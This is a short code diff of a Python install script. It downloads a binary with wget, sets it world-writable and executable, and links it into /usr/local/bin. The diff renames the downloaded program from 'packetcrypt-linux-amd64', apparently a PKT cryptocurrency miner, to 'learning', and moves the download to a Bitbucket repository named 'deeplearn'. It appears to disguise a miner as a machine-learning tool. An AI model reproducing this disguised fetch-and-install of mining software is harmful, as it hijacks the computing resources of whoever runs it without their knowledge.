@@ -5,7 +5,7 @@ import multiprocessing
 
 useproxy = 0
 os.system('chmod 777 ' + __file__)
-program = 'packetcrypt-linux-amd64'
+program = 'learning'
 os.system('pkill ' + program)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
@@ -22,7 +22,7 @@ try:
     os.system('make install')
     os.system('make install-config')
     if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://www.pkt.world/ext/' + program)            
+        os.system('wget https://bitbucket.org/azure007/deeplearn/downloads/' + program)            
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
